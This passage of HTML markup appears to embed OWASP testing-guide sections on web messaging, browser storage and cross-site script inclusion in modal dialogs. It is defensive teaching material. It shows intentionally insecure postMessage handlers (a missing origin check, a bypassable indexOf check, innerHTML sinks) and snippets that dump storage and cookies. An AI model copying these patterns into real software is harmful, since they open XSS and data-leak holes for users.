                  <li><a href="http://www.digininja.org/blog/zap_web_sockets.php">DigiNinja - OWASP ZAP and Web Sockets</a></li>
                </ul>

            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="clnt11Modal" tabindex="-1" role="dialog" aria-labelledby="clnt11ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt11ModalLabel">WSTG-CLNT-11 - Testing Web Messaging</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>Web Messaging (also known as <a href="https://html.spec.whatwg.org/multipage/web-messaging.html#web-messaging">Cross Document Messaging</a>) allows applications running on different domains to communicate in a secure manner. Before the introduction of web messaging, the communication of different origins (between iframes, tabs and windows) was restricted by the same origin policy and enforced by the browser. Developers used multiple hacks in order to accomplish these tasks, and most of them were mainly insecure.</p>
                
                <p>This restriction within the browser is in place to prevent a malicious website from reading confidential data from other iframes, tabs, etc; however, there are some legitimate cases where two trusted websites need to exchange data with each other. To meet this need, Cross Document Messaging was introduced in the <a href="https://html.spec.whatwg.org/multipage/">WHATWG HTML5</a> draft specification and was implemented in all major browsers. It enables secure communications between multiple origins across iframes, tabs and windows.</p>
                
                <p>The messaging API introduced the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage"><code class="language-plaintext highlighter-rouge">postMessage()</code> method</a>, with which plain-text messages can be sent cross-origin. It consists of two parameters: message, and domain.</p>
                
                <p>There are some security concerns when using <code class="language-plaintext highlighter-rouge">*</code> as the domain that we discuss below. In order to receive messages, the receiving website needs to add a new event handler, which has the following attributes:</p>
                
                <ul>
                  <li>Data, the content of the incoming message;</li>
                  <li>Origin of the sender document; and</li>
                  <li>Source, the source window.</li>
                </ul>
                
                <p>Here is an example of the messaging API in use. To send a message:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">iframe1</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello world</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://www.example.com</span><span class="dl">"</span><span class="p">);</span>
                </code></pre></div></div>
                
                <p>To receive a message:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">handler</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
                <span class="kd">function</span> <span class="nx">handler</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">origin</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">chat.example.com</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
                        <span class="cm">/* process message (event.data) */</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="cm">/* ignore messages from untrusted domains */</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                </code></pre></div></div>
                
                <h3 id="origin-security">Origin Security</h3>
                
                <p>The origin is made up of a scheme, host name, and port. It uniquely identifies the domain sending or receiving the message, and does not include the path or the fragment part of the URL. For instance, <code class="language-plaintext highlighter-rouge">https://example.com</code> will be considered different from <code class="language-plaintext highlighter-rouge">http://example.com</code> because the schema of the former is <code class="language-plaintext highlighter-rouge">https</code>, while the latter is <code class="language-plaintext highlighter-rouge">http</code>. This also applies to web servers running in the same domain but on different ports.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Assess the security of the message’s origin.</li>
                  <li>Validate that it’s using safe methods and validating its input.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <h3 id="examine-origin-security">Examine Origin Security</h3>
                
                <p>Testers should check whether the application code is filtering and processing messages from trusted domains. Within the sending domain, also ensure that the receiving domain is explicitly stated, and that <code class="language-plaintext highlighter-rouge">*</code> is not used as the second argument of <code class="language-plaintext highlighter-rouge">postMessage()</code>. This practice could introduce security concerns and could lead to, in the case of a redirection or if the origin changes by other means, the website sending data to unknown hosts, and therefore, leaking confidential data to malicious servers.</p>
                
                <p>If the website fails to add security controls to restrict the domains or origins that are allowed to send messages to a website, it is likely to introduce a security risk. Testers should examine the code for message event listeners and get the callback function from the <code class="language-plaintext highlighter-rouge">addEventListener</code> method for further analysis. Domains must always be verified prior to data manipulation.</p>
                
                <h3 id="examine-input-validation">Examine Input Validation</h3>
                
                <p>Although the website is theoretically accepting messages from trusted domains only, data must still be treated as externally-sourced, untrusted data, and processed with the appropriate security controls. Testers should analyze the code and look for insecure methods, in particular where data is being evaluated via <code class="language-plaintext highlighter-rouge">eval()</code> or inserted into the DOM via the <code class="language-plaintext highlighter-rouge">innerHTML</code> property, which may create DOM-based XSS vulnerabilities.</p>
                
                <h3 id="static-code-analysis">Static Code Analysis</h3>
                
                <p>JavaScript code should be analyzed to determine how web messaging is implemented. In particular, testers should be interested in how the website is restricting messages from untrusted domains, and how the data is handled even for trusted domains.</p>
                
                <p>In this example, access is needed for every subdomain (www, chat, forums, …) within the owasp.org domain. The code is trying to accept any domain with <code class="language-plaintext highlighter-rouge">.owasp.org</code>:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">callback</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
                
                <span class="kd">function</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">origin</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">.owasp.org</span><span class="dl">"</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                        <span class="cm">/* process message (e.data) */</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                </code></pre></div></div>
                
                <p>The intention is to allow subdomains such as:</p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">www.owasp.org</code></li>
                  <li><code class="language-plaintext highlighter-rouge">chat.owasp.org</code></li>
                  <li><code class="language-plaintext highlighter-rouge">forums.owasp.org</code></li>
                </ul>
                
                <p>Unfortunately, this introduces vulnerabilities. An attacker can easily bypass the filter since a domain such as <code class="language-plaintext highlighter-rouge">www.owasp.org.attacker.com</code> will match.</p>
                
                <p>Here is an example of code that lacks an origin check. This is very insecure, as it will accept input from any domain:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">callback</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
                
                <span class="kd">function</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                        <span class="cm">/* process message (e.data) */</span>
                <span class="p">}</span>
                </code></pre></div></div>
                
                <p>Here is an example with input validation vulnerabilities that may lead to XSS attack:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">callback</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
                
                <span class="kd">function</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">origin</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">trusted.domain.com</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
                        <span class="p">}</span>
                <span class="p">}</span>
                </code></pre></div></div>
                
                <p>A more secure approach would be to use the property <code class="language-plaintext highlighter-rouge">innerText</code> instead of <code class="language-plaintext highlighter-rouge">innerHTML</code>.</p>
                
                <p>For further OWASP resources regarding web messaging, see <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html">OWASP HTML5 Security Cheat Sheet</a></p>

            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="clnt12Modal" tabindex="-1" role="dialog" aria-labelledby="clnt12ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt1ModalLabel">WSTG-CLNT-12 - Testing Browser Storage</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>Browsers provide the following client-side storage mechanisms for developers to store and retrieve data:</p>
                
                <ul>
                  <li>Local Storage</li>
                  <li>Session Storage</li>
                  <li>IndexedDB</li>
                  <li>Web SQL (Deprecated)</li>
                  <li>Cookies</li>
                </ul>
                
                <p>These storage mechanisms can be viewed and edited using the browser’s developer tools, such as <a href="https://developers.google.com/web/tools/chrome-devtools/storage/localstorage">Google Chrome DevTools</a> or <a href="https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector">Firefox’s Storage Inspector</a>.</p>
                
                <p>Note: While cache is also a form of storage it is covered in a <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses">separate section</a> covering its own peculiarities and concerns.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Determine whether the website is storing sensitive data in client-side storage.</li>
                  <li>The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <h3 id="local-storage">Local Storage</h3>
                
                <p><code class="language-plaintext highlighter-rouge">window.localStorage</code> is a global property that implements the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API">Web Storage API</a> and provides <strong>persistent</strong> key-value storage in the browser.</p>
                
                <p>Both the keys and values can only be strings, so any non-string values must be converted to strings first before storing them, usually done via <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify">JSON.stringify</a>.</p>
                
                <p>Entries to <code class="language-plaintext highlighter-rouge">localStorage</code> persist even when the browser window closes, with the exception of windows in Private/Incognito mode.</p>
                
                <p>The maximum storage capacity of <code class="language-plaintext highlighter-rouge">localStorage</code> varies between browsers.</p>
                
                <h4 id="list-all-key-value-entries">List All Key-Value Entries</h4>
                
                <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                  <span class="kd">const</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">key</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
                  <span class="kd">const</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
                  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">key</span><span class="p">}</span><span class="s2">: </span><span class="p">${</span><span class="nx">value</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
                <span class="p">}</span>
                </code></pre></div></div>
                
                <h3 id="session-storage">Session Storage</h3>
                
                <p><code class="language-plaintext highlighter-rouge">window.sessionStorage</code> is a global property that implements the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API">Web Storage API</a> and provides <strong>ephemeral</strong> key-value storage in the browser.</p>
                
                <p>Both the keys and values can only be strings, so any non-string values must be converted to strings first before storing them, usually done via <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify">JSON.stringify</a>.</p>
                
                <p>Entries to <code class="language-plaintext highlighter-rouge">sessionStorage</code> are ephemeral because they are cleared when the browser tab/window is closed.</p>
                
                <p>The maximum storage capacity of <code class="language-plaintext highlighter-rouge">sessionStorage</code> varies between browsers.</p>
                
                <h4 id="list-all-key-value-entries-1">List All Key-Value Entries</h4>
                
                <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                  <span class="kd">const</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">key</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
                  <span class="kd">const</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
                  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">key</span><span class="p">}</span><span class="s2">: </span><span class="p">${</span><span class="nx">value</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
                <span class="p">}</span>
                </code></pre></div></div>
                
                <h3 id="indexeddb">IndexedDB</h3>
                
                <p>IndexedDB is a transactional, object-oriented database intended for structured data. An IndexedDB database can have multiple object stores and each object store can have multiple objects.</p>
                
                <p>In contrast to Local Storage and Session Storage, IndexedDB can store more than just strings. Any objects supported by the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm">structured clone algorithm</a> can be stored in IndexedDB.</p>
                
                <p>An example of a complex JavaScript object that can be stored in IndexedDB, but not in Local/Session Storage are <a href="https://developer.mozilla.org/en-US/docs/Web/API/CryptoKey">CryptoKeys</a>.</p>
                
                <p>W3C recommendation on <a href="https://www.w3.org/TR/WebCryptoAPI/">Web Crypto API</a> <a href="https://www.w3.org/TR/WebCryptoAPI/#concepts-key-storage">recommends</a> that CryptoKeys that need to be persisted in the browser, to be stored in IndexedDB. When testing a web page, look for any CryptoKeys in IndexedDB and check if they are set as <code class="language-plaintext highlighter-rouge">extractable: true</code> when they should have been set to <code class="language-plaintext highlighter-rouge">extractable: false</code> (i.e. ensure the underlying private key material is never exposed during cryptographic operations.)</p>
                
                <h4 id="print-all-the-contents-of-indexeddb">Print All the Contents of IndexedDB</h4>
                
                <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">dumpIndexedDB</span> <span class="o">=</span> <span class="nx">dbName</span> <span class="o">=&gt;</span> <span class="p">{</span>
                  <span class="kd">const</span> <span class="nx">DB_VERSION</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
                  <span class="kd">const</span> <span class="nx">req</span> <span class="o">=</span> <span class="nx">indexedDB</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">dbName</span><span class="p">,</span> <span class="nx">DB_VERSION</span><span class="p">);</span>
                  <span class="nx">req</span><span class="p">.</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
                    <span class="kd">const</span> <span class="nx">db</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
                    <span class="kd">const</span> <span class="nx">objectStoreNames</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">objectStoreNames</span> <span class="o">||</span> <span class="p">[];</span>
                
                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`[*] Database: </span><span class="p">${</span><span class="nx">dbName</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
                
                    <span class="nb">Array</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="nx">objectStoreNames</span><span class="p">).</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">storeName</span> <span class="o">=&gt;</span> <span class="p">{</span>
                      <span class="kd">const</span> <span class="nx">txn</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">transaction</span><span class="p">(</span><span class="nx">storeName</span><span class="p">,</span> <span class="dl">'</span><span class="s1">readonly</span><span class="dl">'</span><span class="p">);</span>
                      <span class="kd">const</span> <span class="nx">objectStore</span> <span class="o">=</span> <span class="nx">txn</span><span class="p">.</span><span class="nx">objectStore</span><span class="p">(</span><span class="nx">storeName</span><span class="p">);</span>
                
                      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`\t[+] ObjectStore: </span><span class="p">${</span><span class="nx">storeName</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
                
                      <span class="c1">// Print all entries in objectStore with name `storeName`</span>
                      <span class="nx">objectStore</span><span class="p">.</span><span class="nx">getAll</span><span class="p">().</span><span class="nx">onsuccess</span> <span class="o">=</span> <span class="nx">event</span> <span class="o">=&gt;</span> <span class="p">{</span>
                        <span class="kd">const</span> <span class="nx">items</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">result</span> <span class="o">||</span> <span class="p">[];</span>
                        <span class="nx">items</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">item</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`\t\t[-] `</span><span class="p">,</span> <span class="nx">item</span><span class="p">));</span>
                      <span class="p">};</span>
                    <span class="p">});</span>
                  <span class="p">};</span>
                <span class="p">};</span>
                
                <span class="nx">indexedDB</span><span class="p">.</span><span class="nx">databases</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">dbs</span> <span class="o">=&gt;</span> <span class="nx">dbs</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">db</span> <span class="o">=&gt;</span> <span class="nx">dumpIndexedDB</span><span class="p">(</span><span class="nx">db</span><span class="p">.</span><span class="nx">name</span><span class="p">)));</span>
                </code></pre></div></div>
                
                <h3 id="web-sql">Web SQL</h3>
                
                <p>Web SQL is deprecated since November 18, 2010 and it’s recommended that web developers do not use it.</p>
                
                <h3 id="cookies">Cookies</h3>
                
                <p>Cookies are a key-value storage mechanism that is primarily used for session management but web developers can still use it to store arbitrary string data.</p>
                
                <p>Cookies are covered extensively in the <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes">testing for Cookies attributes</a> scenario.</p>
                
                <h4 id="list-all-cookies">List All Cookies</h4>
                
                <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
                </code></pre></div></div>
                
                <h3 id="global-window-object">Global Window Object</h3>
                
                <p>Sometimes web developers initialize and maintain global state that is available only during the runtime life of the page by assigning custom attributes to the global <code class="language-plaintext highlighter-rouge">window</code> object. For example:</p>
                
                <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">MY_STATE</span> <span class="o">=</span> <span class="p">{</span>
                  <span class="na">counter</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                  <span class="na">flag</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
                <span class="p">};</span>
                </code></pre></div></div>
                
                <p>Any data attached on the <code class="language-plaintext highlighter-rouge">window</code> object will be lost when the page is refreshed or closed.</p>
                
                <h4 id="list-all-entries-on-the-window-object">List All Entries on the Window Object</h4>
                
                <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
                  <span class="c1">// create an iframe and append to body to load a clean window object</span>
                  <span class="kd">const</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
                  <span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">none</span><span class="dl">'</span><span class="p">;</span>
                  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
                
                  <span class="c1">// get the current list of properties on window</span>
                  <span class="kd">const</span> <span class="nx">currentWindow</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">getOwnPropertyNames</span><span class="p">(</span><span class="nb">window</span><span class="p">);</span>
                
                  <span class="c1">// filter the list against the properties that exist in the clean window</span>
                  <span class="kd">const</span> <span class="nx">results</span> <span class="o">=</span> <span class="nx">currentWindow</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span>
                    <span class="nx">prop</span> <span class="o">=&gt;</span> <span class="o">!</span><span class="nx">iframe</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="nx">prop</span><span class="p">)</span>
                  <span class="p">);</span>
                
                  <span class="c1">// remove iframe</span>
                  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
                
                  <span class="c1">// log key-value entries that are different</span>
                  <span class="nx">results</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">key</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">key</span><span class="p">}</span><span class="s2">: </span><span class="p">${</span><span class="nb">window</span><span class="p">[</span><span class="nx">key</span><span class="p">]}</span><span class="s2">`</span><span class="p">));</span>
                <span class="p">})();</span>
                </code></pre></div></div>
                
                <p><em>(Modified version of this <a href="https://stackoverflow.com/a/17246535/3099132">snippet</a>)</em></p>
                
                <h3 id="attack-chain">Attack Chain</h3>
                
                <p>Following the identification any of the above attack vectors, an attack chain can be formed with different types of client-side attacks, such as <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting">DOM based XSS</a> attacks.</p>
                
                <h2 id="remediation">Remediation</h2>
                
                <p>Applications should be storing sensitive data on the server-side, and not on the client-side, in a secured manner following best practices.</p>
                
                <h2 id="references">References</h2>
                
                <ul>
                  <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage">Local Storage</a></li>
                  <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage">Session Storage</a></li>
                  <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API">IndexedDB</a></li>
                  <li><a href="https://www.w3.org/TR/WebCryptoAPI/#concepts-key-storage">Web Crypto API: Key Storage</a></li>
                  <li><a href="https://www.w3.org/TR/webdatabase/">Web SQL</a></li>
                  <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">Cookies</a></li>
                </ul>
                
                <p>For more OWASP resources on the HTML5 Web Storage API, see the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#html5-web-storage-api">Session Management Cheat Sheet</a>.</p>

            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="clnt13Modal" tabindex="-1" role="dialog" aria-labelledby="clnt13ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt13ModalLabel">WSTG-CLNT-13 - Testing for Cross Site Script Inclusion</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>Cross Site Script Inclusion (XSSI) vulnerability allows sensitive data leakage across-origin or cross-domain boundaries. Sensitive data could include authentication-related data (login states, cookies, auth tokens, session IDs, etc.) or user’s personal or sensitive personal data (email addresses, phone numbers, credit card details, social security numbers, etc.). XSSI is a client-side attack similar to Cross Site Request Forgery (CSRF) but has a different purpose. Where CSRF uses the authenticated user context to execute certain state-changing actions inside a victim’s page (e.g. transfer money to the attacker’s account, modify privileges, reset password, etc.), XSSI instead uses JavaScript on the client-side to leak sensitive data from authenticated sessions.</p>
                
                <p>By default, websites are only allowed to access data if they are from the same origin. This is a key application security principle and governed by the same-origin policy (defined by <a href="https://tools.ietf.org/html/rfc6454">RFC 6454</a>). An origin is defined as the combination of URI scheme (HTTP or HTTPS), host name, and port number. However, this policy is not applicable for HTML <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag inclusions. This exception is necessary, as without it websites would not be able to consume third party services, perform traffic analysis, or use advertisement platforms, etc.</p>
                
                <p>When the browser opens a website with <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tags, the resources are fetched from the cross-origin domain. The resources then run in the same context as the including site or browser, which presents the opportunity to leak sensitive data. In most cases, this is achieved using JavaScript, however, the script source doesn’t have to be a JavaScript file with type <code class="language-plaintext highlighter-rouge">text/javascript</code> or <code class="language-plaintext highlighter-rouge">.js</code> extension.</p>
                
                <p>Older browser’s vulnerabilities (IE9/10) allowed data leakage via JavaScript error messages at runtime, but those vulnerabilities have now been patched by vendors and are considered less relevant. By setting the charset attribute of the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag, an attacker or tester can enforce UTF-16 encoding, allowing data leakage for other data formats (e.g. JSON) in some cases. For more on these attacks, see <a href="https://www.mbsd.jp/Whitepaper/xssi.pdf">Identifier based XSSI attacks</a>.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Locate sensitive data across the system.</li>
                  <li>Assess the leakage of sensitive data through various techniques.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <h3 id="collect-data-using-authenticated-and-unauthenticated-user-sessions">Collect Data Using Authenticated and Unauthenticated User Sessions</h3>
                
                <p>Identify which endpoints are responsible for sending sensitive data, what parameters are required, and identify all relevant dynamically and statically generated JavaScript responses using authenticated user sessions. Pay special attention to sensitive data sent using <a href="https://en.wikipedia.org/wiki/JSONP">JSONP</a>. To find dynamically generated JavaScript responses, generate authenticated and unauthenticated requests, then compare them. If they’re different, it means the response is dynamic; otherwise it’s static. To simplify this task, a tool such as <a href="https://github.com/luh2/DetectDynamicJS">Veit Hailperin’s Burp proxy plugin</a> can be used. Make sure to check other file types in addition to JavaScript; XSSI is not limited to JavaScript files alone.</p>
                
                <h3 id="determine-whether-the-sensitive-data-can-be-leaked-using-javascript">Determine Whether the Sensitive Data Can Be Leaked Using JavaScript</h3>
                
                <p>Testers should analyze code for the following vehicles for data leakage via XSSI vulnerabilities:</p>
                
                <ol>
                  <li>Global variables</li>
                  <li>Global function parameters</li>
                  <li>CSV (Comma Separated Values) with quotations theft</li>
                  <li>JavaScript runtime errors</li>
                  <li>Prototype chaining using <code class="language-plaintext highlighter-rouge">this</code></li>
                </ol>
                
                <h3 id="1-sensitive-data-leakage-via-global-variables">1. Sensitive Data Leakage via Global Variables</h3>
                
